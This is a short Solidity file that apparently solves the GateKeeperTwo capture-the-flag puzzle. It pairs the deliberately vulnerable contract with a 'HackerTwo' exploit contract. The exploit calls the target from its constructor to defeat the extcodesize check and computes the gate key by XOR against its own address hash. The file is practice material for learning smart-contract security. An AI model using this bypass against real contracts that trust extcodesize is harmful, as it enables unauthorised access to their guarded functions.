// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

contract GateKeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract HackerTwo {
    constructor(address victim) public {
        uint64 c = (uint64(0)-1);
        uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 b = c ^ a;
        bytes8 _gateKey = bytes8(b);
        (bool success, ) = victim.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        require(success, "tx failed");
    }
}